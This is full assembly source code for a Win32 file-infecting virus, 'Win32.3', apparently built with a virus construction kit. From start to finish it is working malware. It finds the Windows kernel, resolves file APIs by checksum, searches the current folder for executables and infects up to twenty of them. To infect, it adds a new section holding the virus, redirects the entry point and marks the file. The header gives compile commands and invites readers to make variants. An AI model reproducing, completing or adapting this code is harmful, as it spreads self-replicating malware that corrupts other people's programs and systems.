              
;
;
; Win32.3 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.3
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 3
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 28
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ebx, dword ptr [esp]
                                        ; add esp, 4
 inc esp
 add esp, 3d
                                        ; mov ebp, ebx
                                        ; clear ebp
 and ebp, 0
 add ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear esi
 xor esi, esi
 xor esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], esi

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 mov edi, offset filemask
 add edi, ebp

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 or edx, 51196271d                      ; Trash
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 xor ecx, ecx
 add ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea edi, [ebp+APIOffsets]
 sal edx, 30d                           ; Trash
 xchg edi, esi

 mov eax, offset APINames
 add eax, ebp


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; esi points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], edx
                                        ; add esi, 4
 dec esi
 add esi, 5d
 sub ecx, 1
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 push 276d
 pop ecx
 mov ebx, ebp
 add ebx, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 ror eax, 16d                           ; Trash
 push 1
 mov ebx, 80000000h or 40000000h
 xor eax, 34029824d                     ; Trash
 push ebx
 mov eax, offset WFD_szFileName
 add eax, ebp

 push eax
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 inc eax
 dec eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, ( 2d xor 7d )
 xor ecx, 7d
 push ecx
 add eax, eax                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 shl ecx, 23d                           ; Trash
                                        ; store old EIP and ImageBase
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 jmp eax



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; round to pages
 ror esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 sub esi, -1d
 sbb eax, 27d                           ; Trash
GetKernelLoop:
                                        ; clear edx
 xor edx, edx
 add esi, -1
 mov dx, word ptr [esi+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 cmp esi, dword ptr [esi+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], esi
 mov ebx, esi
 add ebx, [esi+3Ch]
 mov [KernelPE+ebp], ebx

 lea edx, GetApis
 add edx, ebp
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
                                        ; get ATableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add edi, 4
 add edi, 4d
                                        ; get NTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 push edx
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 not ecx                                ; Trash
 lea ecx, [ebp+WFD_nFileSizeHigh]
 xchg ecx, ebx

 cmp dword ptr [ebx], 0
 jne NoInfection
                                        ; get and remove file attributes
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d - 38d )
 add eax, 38d
 push eax
 mov ebx, ebp
 add ebx, offset WFD_szFileName


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 lea ebx, [ebp+WFD_nFileSizeLow]
 xchg eax, ebx

 cmp dword ptr [eax], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [edi]
 cmp ecx, 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 mov ecx, 45794146d                     ; Trash
 cmp word ptr [edi+3Ch], 0h
 je Notagoodfile
                                        ; clear ecx
 mov ecx, -39840d
 add ecx, 39840d
 add ecx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, edi
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [ecx]
 cmp eax, 'EP'
 je Goodfile2
                                        ; mov ebx, 56289
 push 56289d
 pop ebx
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 cmp ebx, 56289d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '3'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov ax, word ptr [ecx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [ecx+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 not edx                                ; Trash
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ebx

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret
 sbb edx, 28d                           ; Trash




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 xor dword ptr [ebp+NTableTemp], ebx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
                                        ; clear ebx
 mov ebx, -47453d
 add ebx, 47453d
 add ebx, ecx
                                        ; mov esi, ecx
 mov esi, ecx
 push esi
 mov dword ptr [ebp+TempApisearch3], eax
 rol edx, 1d                            ; Trash
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [eax]
 LoopChsksm:
                                        ; clear edx
 push 0
 pop edx
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 shl dx,8d
 sub ecx, edx
 test dx, dx
 jz LoopConti
                                        ; clear edx
 push 0
 pop edx
 dec dword ptr [ebp+Trash1]             ; Trash
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 sub ecx, edx
 cmp dx, 0
 jne LoopChsksm
LoopConti:
 test ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov eax, dword ptr [ebp+TempApisearch3]
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
 ror edx, 24d                           ; Trash
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, edx
 movzx ecx, word ptr [edx]
 sal ecx, 2h
 add ebx, ebx                           ; Trash
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], edx
 or ebx, ebx                            ; Trash
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 OldBase     dd 400000h
 counter     dw 0h
 KernelPE    dd 0h
 Misc1       dd 0h
 AlignReg1   dd 0h
 ATableVA    dd 0h
 AlignTemp   dd 0h
 NewSize     dd 0h
 filemask    db '*.EXe',0
 InfCounter  dd 0h
 MapAddress  dd 0h
 NewEIP      dd 0h
 MapHandle   dd 0h
 TempAPI     dd 0h
 FileHandle  dd 0h
 db 'Win32.3 created by SnakeByte',0
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable


 APIOffsets:
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h


 APINames:
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 NTableTemp  dd 0h
 NTableVA    dd 0h
 PEheader    dd 0h
 sectionalign   dd 0h
 FindHandle  dd 0h

 TempApisearch3 dd 0h
 OTableVA    dd 0h
 Attributes  dd 0h
 Trash1      dd 0h
 filealign   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelMZ    dd 0h
 AlignReg2   dd 0h
 OldEIP      dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [ecx+3Ch]
 add esi, ecx
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov ebx, [esi]
 add esi, -60d
 push ebx
 pop dword ptr [ebp+filealign]
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [ebx+28h]
 sal edx, 2d                            ; Trash
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [ebx+34h]
 mov dword ptr [ebp+OldBase], edx
 mov ecx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ecx, [ebx+74h]
 shl ecx, 3
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [ebx+6h]
 mov edx, 28h
 pushad
 mov eax, eax
 mul edx
 mov dword ptr [ebp+Misc1], 0
 add dword ptr [ebp+Misc1], eax
 popad
 mov eax, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, ecx
 add ebx, eax
 lea ecx, [ebp+newsection]
 xchg ecx, edx


 xchg edx, ebx
 push edx
                                        ; Calculate the RVA of the new section
 mov ebx, [edx-5*8+8d]
 add ebx, [edx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 add dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[edx-5*8+20d]
 add ecx,[edx-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 mov eax, dword ptr [ebp+filealign]
 mov edx, ebx
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], edx
 neg ebx                                ; Trash
 call CreateMap
 jc NoEXE
 lea eax, [ebp+newsection]
 xchg eax, esi

 pop edx
                                        ; mov ebx, 16
 mov ebx, ( 16d xor 9d )
 xor ebx, 9d
WriteNewSectionLoop:
 push dword ptr [esi]
 sar eax, 13d                           ; Trash
 pop dword ptr [edx]
 dec ebx
                                        ; add esi, 4
 add esi, 4d
                                        ; add edx, 4
 add edx, 4d
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 sub word ptr [ecx+06h], -1
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; set new EIP
 mov dword ptr  [ecx+28h], ebx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 0h
 add dword ptr [ecx+4Ch], '3'
                                        ; clear ecx
 xor ecx, ecx
 xor ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]
 rcl edx, 23d                           ; Trash

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 or eax, eax                            ; Trash
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

